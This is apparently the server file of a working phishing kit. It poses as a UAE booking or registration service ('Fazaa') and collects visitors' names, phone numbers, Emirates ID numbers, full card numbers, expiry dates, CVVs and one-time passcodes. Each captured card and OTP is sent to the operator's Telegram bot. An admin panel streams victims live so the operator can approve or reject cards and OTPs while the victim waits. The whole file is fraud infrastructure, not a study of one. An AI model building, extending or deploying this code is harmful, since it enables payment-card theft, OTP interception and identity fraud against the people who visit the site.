import express from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { createRequire } from 'module';
import { store, storeEvents } from './lib/store.js';
import { notifyNewRegistration, notifyNewCard, notifyNewOtp, sendTelegramMessage } from './lib/telegram.js';

const require = createRequire(import.meta.url);
const { ZipArchive } = require('archiver');

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

// Universal CORS support for Netlify and external origins
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, rsc');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());

// Track notified visitors to prevent spam
const notifiedRegistrations = new Set();
const notifiedCards = new Set();
const notifiedOtps = new Set();

// ─── Real-time Database Live Stream (SSE) ──────────────────────────────────
// Keeps the admin panel permanently connected to the database with zero disconnects
app.get('/api/admin/stream', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no'
  });
  res.write('\n');

  try {
    const list = store.getVisitors();
    res.write(`data: ${JSON.stringify({ type: 'init', status: 'connected', visitors: list })}\n\n`);
  } catch (e) {}

  const onDbChange = () => {
    try {
      const list = store.getVisitors();
      res.write(`data: ${JSON.stringify({ type: 'update', status: 'connected', visitors: list })}\n\n`);
    } catch (err) {}
  };

  storeEvents.on('change', onDbChange);

  const pingInterval = setInterval(() => {
    try {
      res.write(': keep-alive\n\n');
    } catch (e) {}
  }, 10000);

  req.on('close', () => {
    clearInterval(pingInterval);
    storeEvents.off('change', onDbChange);
  });
});

app.get('/api/admin/db-status', (req, res) => {
  const visitors = store.getVisitors();
  res.json({
    status: 'connected',
    connected: true,
    totalVisitors: visitors.length,
    timestamp: new Date().toISOString()
  });
});

// ─── Admin API Routes ────────────────────────────────────────────────────────
app.get('/api/admin/me', (req, res) => {
  res.json({ id: '1', email: 'admin@cr7.com', name: 'CR7 Admin' });
});

app.post('/api/admin/login', (req, res) => {
  res.json({ success: true, user: { id: '1', email: 'admin@cr7.com' } });
});

app.post('/api/admin/logout', (req, res) => {
  res.json({ success: true });
});

app.get('/api/admin/visitors', (req, res) => {
  const visitors = store.getVisitors();
  res.json(visitors);
});

app.put('/api/admin/visitors/:id', (req, res) => {
  const updated = store.updateVisitor(req.params.id, req.body);
  if (!updated) return res.status(404).json({ error: 'Visitor not found' });
  res.json(updated);
});

app.patch('/api/admin/visitors/:id', (req, res) => {
  const updated = store.updateVisitor(req.params.id, req.body);
  if (!updated) return res.status(404).json({ error: 'Visitor not found' });
  res.json(updated);
});

app.post('/api/admin/visitors/:id/status', (req, res) => {
  const { orderStatus } = req.body;
  if (!orderStatus) return res.status(400).json({ error: 'orderStatus is required' });
  const updated = store.updateVisitor(req.params.id, { orderStatus });
  if (!updated) return res.status(404).json({ error: 'Visitor not found' });
  res.json({ success: true, visitor: updated });
});

app.delete('/api/admin/visitors/:id', (req, res) => {
  store.deleteVisitor(req.params.id);
  res.json({ success: true });
});

app.get('/api/admin/blocked-ips', (req, res) => {
  res.json(store.getBlockedIps());
});

app.post('/api/admin/blocked-ips', (req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: 'IP required' });
  const list = store.addBlockedIp(ip);
  res.json(list);
});

app.delete('/api/admin/blocked-ips/:ip', (req, res) => {
  const list = store.removeBlockedIp(req.params.ip);
  res.json(list);
});

app.get('/api/admin/blocked-bins', (req, res) => {
  res.json(store.getBlockedBins());
});

app.post('/api/admin/blocked-bins', (req, res) => {
  const { bin } = req.body;
  if (!bin) return res.status(400).json({ error: 'BIN required' });
  const list = store.addBlockedBin(bin);
  res.json(list);
});

app.delete('/api/admin/blocked-bins/:bin', (req, res) => {
  const list = store.removeBlockedBin(req.params.bin);
  res.json(list);
});

// ─── Telegram Notification Config Routes ────────────────────────────────────
app.get('/api/admin/telegram-config', (req, res) => {
  res.json(store.getTelegramConfig());
});

app.post('/api/admin/telegram-config', (req, res) => {
  const { token, chatId, enabled } = req.body;
  const saved = store.saveTelegramConfig({ token, chatId, enabled });
  res.json({ success: true, config: saved });
});

app.post('/api/admin/telegram-test', async (req, res) => {
  const { token, chatId } = req.body;
  const targetToken = token || store.getTelegramConfig().token || process.env.TELEGRAM_BOT_TOKEN;
  const targetChatId = chatId || store.getTelegramConfig().chatId || process.env.TELEGRAM_CHAT_ID;

  if (!targetToken || !targetChatId) {
    return res.status(400).json({ error: 'Token and Chat ID required' });
  }

  try {
    const url = `https://api.telegram.org/bot${targetToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: targetChatId,
        text: '✅ <b>تم ربط لوحة التحكم بالتلجرام بنجاح!</b>\nستصلك جميع التسجيلات والبطاقات الجديدة هنا فوراً.',
        parse_mode: 'HTML'
      })
    });
    const result = await response.json();
    if (result.ok) {
      res.json({ success: true, result });
    } else {
      res.status(400).json({ success: false, error: result.description });
    }
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Universal visitor ID sanitizer
function cleanVisitorId(rawId) {
  if (typeof rawId === 'string' && rawId.trim().length > 0 && rawId !== '[object Object]') {
    return rawId.trim();
  }
  return `vis_${Date.now().toString(36)}_${Math.random().toString(36).substr(2, 6)}`;
}

// ─── Client / Visitor API Routes ─────────────────────────────────────────────
app.post('/api/client/heartbeat', (req, res) => {
  const { id, visitorId, step, path: currentPath, name, fullName, phone, email, emiratesId, bookingData, cardNumber, expiry, cvv, cardHolder, otp, title, ...rest } = req.body;
  const targetId = cleanVisitorId(id || visitorId);
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  
  if (targetId) {
    const resolvedName = name || fullName || (bookingData && (bookingData['الاسم'] || bookingData.fullName || bookingData.name)) || undefined;
    const resolvedPhone = phone || (bookingData && (bookingData['الهاتف'] || bookingData['رقم الهاتف'] || bookingData.phone)) || undefined;
    const resolvedEid = emiratesId || (bookingData && (bookingData['الهوية'] || bookingData['رقم الهوية'] || bookingData.emiratesId)) || undefined;

    const dataToUpsert = {
      id: targetId,
      ip: String(ip).split(',')[0].trim(),
      step: step || 'schedule',
      currentPath: currentPath || '/',
      pageTitle: title || undefined,
      ...rest
    };
    if (resolvedName) dataToUpsert.name = resolvedName;
    if (resolvedPhone) dataToUpsert.phone = resolvedPhone;
    if (email) dataToUpsert.email = email;
    if (resolvedEid) dataToUpsert.emiratesId = resolvedEid;
    if (bookingData) dataToUpsert.bookingData = bookingData;
    if (cardNumber) dataToUpsert.cardNumber = cardNumber;
    if (expiry) dataToUpsert.expiry = expiry;
    if (cvv) dataToUpsert.cvv = cvv;
    if (cardHolder) dataToUpsert.cardHolder = cardHolder;
    if (otp) dataToUpsert.otp = otp;

    const updated = store.upsertVisitor(dataToUpsert);

    // If registration info provided and not yet notified
    if ((dataToUpsert.name || dataToUpsert.phone) && !notifiedRegistrations.has(targetId + (dataToUpsert.name || ''))) {
      notifiedRegistrations.add(targetId + (dataToUpsert.name || ''));
      notifyNewRegistration(updated).catch(() => {});
    }
  }
  res.json({ success: true, visitorId: targetId });
});

app.post(['/api/client/track', '/api/client/register', '/api/client/order'], (req, res) => {
  const { visitorId, id, name, fullName, phone, email, emiratesId, step, bookingData, cardNumber, expiry, cvv, cardHolder, brand, cardType } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  const targetId = cleanVisitorId(visitorId || id);

  const resolvedName = name || fullName || (bookingData && (bookingData['الاسم'] || bookingData.fullName || bookingData.name)) || undefined;
  const resolvedPhone = phone || (bookingData && (bookingData['الهاتف'] || bookingData['رقم الهاتف'] || bookingData.phone)) || undefined;
  const resolvedEid = emiratesId || (bookingData && (bookingData['الهوية'] || bookingData['رقم الهوية'] || bookingData.emiratesId)) || undefined;

  const dataToUpsert = {
    id: targetId,
    ip: String(ip).split(',')[0].trim(),
    name: resolvedName,
    phone: resolvedPhone,
    email: email || undefined,
    emiratesId: resolvedEid,
    step: step || 'passenger_details',
    bookingData: bookingData || undefined,
    orderStatus: 'pending'
  };

  if (brand) dataToUpsert.brand = brand;
  if (cardType) dataToUpsert.cardType = cardType;
  if (cardNumber) dataToUpsert.cardNumber = cardNumber;
  if (expiry) dataToUpsert.expiry = expiry;
  if (cvv) dataToUpsert.cvv = cvv;
  if (cardHolder) dataToUpsert.cardHolder = cardHolder;

  const updated = store.upsertVisitor(dataToUpsert);

  // Send Telegram notification on new registration
  const regKey = (targetId || '') + (dataToUpsert.name || '') + (dataToUpsert.phone || '');
  if ((dataToUpsert.name || dataToUpsert.phone) && !notifiedRegistrations.has(regKey)) {
    notifiedRegistrations.add(regKey);
    notifyNewRegistration(updated).catch(() => {});
  }

  res.json({ success: true, visitorId: targetId, visitor: updated });
});

app.post('/api/client/card', (req, res) => {
  const { visitorId, cardNumber, expiry, cvv, cardHolder } = req.body;
  const targetId = cleanVisitorId(visitorId);
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  const bin = cardNumber ? cardNumber.replace(/\D/g, '').slice(0, 6) : '';

  // Check if BIN is blocked
  const blockedBins = store.getBlockedBins();
  const isBlocked = blockedBins.includes(bin);

  const updated = store.upsertVisitor({
    id: targetId,
    ip: String(ip).split(',')[0].trim(),
    cardNumber,
    expiry,
    cvv,
    cardHolder,
    cardSubmittedAt: new Date().toISOString(),
    cardApprovalStatus: isBlocked ? 'rejected' : 'waiting',
    step: isBlocked ? 'card_error' : 'payment'
  });

  // Send Telegram notification on new card
  const cardKey = (targetId || '') + (cardNumber || '');
  if (cardNumber && !notifiedCards.has(cardKey)) {
    notifiedCards.add(cardKey);
    notifyNewCard(updated).catch(() => {});
  }

  res.json({ success: true, visitorId: targetId, isBlocked, visitor: updated });
});

app.post('/api/client/otp', (req, res) => {
  const { visitorId, otp } = req.body;
  const targetId = cleanVisitorId(visitorId);
  const updated = store.upsertVisitor({
    id: targetId,
    otp,
    otpSubmittedAt: new Date().toISOString(),
    otpApprovalStatus: 'waiting',
    step: 'otp'
  });

  // Send Telegram notification on new OTP
  const otpKey = (targetId || '') + (otp || '');
  if (otp && !notifiedOtps.has(otpKey)) {
    notifiedOtps.add(otpKey);
    notifyNewOtp(updated).catch(() => {});
  }

  res.json({ success: true, visitorId: targetId, visitor: updated });
});

app.get('/api/client/status/:id', (req, res) => {
  const visitor = store.getVisitorById(req.params.id);
  if (!visitor) {
    return res.json({ step: 'schedule', cardApprovalStatus: null, otpApprovalStatus: null });
  }
  res.json({
    id: visitor.id,
    step: visitor.step,
    cardApprovalStatus: visitor.cardApprovalStatus,
    otpApprovalStatus: visitor.otpApprovalStatus,
    status: visitor.status
  });
});

// Direct project zip download endpoint
app.get(['/download-project', '/project.zip', '/api/download-zip'], (req, res) => {
  res.attachment('project-files.zip');
  const archive = new ZipArchive({ zlib: { level: 9 } });

  archive.on('error', (err) => {
    res.status(500).send({ error: err.message });
  });

  archive.pipe(res);

  archive.glob('**/*', {
    cwd: __dirname,
    dot: true,
    ignore: [
      'node_modules/**',
      '.git/**',
      '.cache/**',
      'dist/**',
      'build/**',
      'bun.lock',
      'package.json',
      'package-lock.json',
      '*.zip',
      'data/**',
      'server.js'
    ]
  });

  archive.finalize();
});

// Explicit redirects & Control panel routes
app.get(['/admin', '/admin/', '/dashboard', '/dashboard/'], (req, res) => {
  const adminHtml = path.join(__dirname, 'admin.html');
  if (fs.existsSync(adminHtml)) {
    return res.sendFile(adminHtml);
  }
  const dashboardHtml = path.join(__dirname, 'dashboard.html');
  if (fs.existsSync(dashboardHtml)) {
    return res.sendFile(dashboardHtml);
  }
  res.status(404).send('Dashboard not found');
});

// Handle Next.js RSC payload requests (.txt files)
app.use((req, res, next) => {
  if (req.headers['rsc'] === '1' || req.query._rsc !== undefined) {
    const cleanPath = req.path.replace(/^\//, '').replace(/\/$/, '') || 'index';
    const txtPath = path.join(__dirname, `${cleanPath}.txt`);
    if (fs.existsSync(txtPath)) {
      res.setHeader('Content-Type', 'text/x-component');
      return res.sendFile(txtPath);
    }
  }
  next();
});

const redirects = {
  '/radar': '/radar.html',
  '/radar/': '/radar.html',
  '/register': '/register.html',
  '/register/': '/register.html',
  '/simple-register': '/register.html',
  '/simple-register/': '/register.html',
  '/register-new': '/register.html',
  '/register-new/': '/register.html',
};

app.use((req, res, next) => {
  const cleanPath = req.path.replace(/\/$/, '') || '/';
  if (redirects[req.path] || redirects[cleanPath]) {
    const target = redirects[req.path] || redirects[cleanPath];
    const targetPath = path.join(__dirname, target);
    if (fs.existsSync(targetPath)) {
      return res.sendFile(targetPath);
    }
  }
  next();
});

// Specifically handle /cards and /cards/ route because a directory named "cards" exists for card images
app.get(['/cards', '/cards/'], (req, res) => {
  const cardsHtml = path.join(__dirname, 'cards.html');
  if (fs.existsSync(cardsHtml)) {
    return res.sendFile(cardsHtml);
  }
  res.status(404).sendFile(path.join(__dirname, '404.html'));
});

// Serve client-tracker.js and dashboard-bundle.js from public
app.get('/client-tracker.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/client-tracker.js'));
});
app.get('/dashboard-bundle.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/dashboard-bundle.js'));
});
app.get(['/recharts.js', '/recharts.bundle.js'], (req, res) => {
  res.sendFile(path.join(__dirname, 'public/recharts.bundle.js'));
});

// Serve static assets with clean URLs enabled
app.use(express.static(__dirname, {
  extensions: ['html', 'htm'],
  index: 'index.html',
  dotfiles: 'allow'
}));

// Route fallback: check if <route>.html or <route>/index.html exists
app.use((req, res) => {
  const decodedPath = decodeURIComponent(req.path);
  const possibleHtml = path.join(__dirname, `${decodedPath}.html`);
  if (fs.existsSync(possibleHtml) && fs.statSync(possibleHtml).isFile()) {
    return res.sendFile(possibleHtml);
  }

  const possibleIndex = path.join(__dirname, decodedPath, 'index.html');
  if (fs.existsSync(possibleIndex) && fs.statSync(possibleIndex).isFile()) {
    return res.sendFile(possibleIndex);
  }

  const notFound = path.join(__dirname, '404.html');
  if (fs.existsSync(notFound)) {
    return res.status(404).sendFile(notFound);
  }
  res.status(404).send('Not Found');
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Fazaa app server running on http://0.0.0.0:${PORT}`);
});
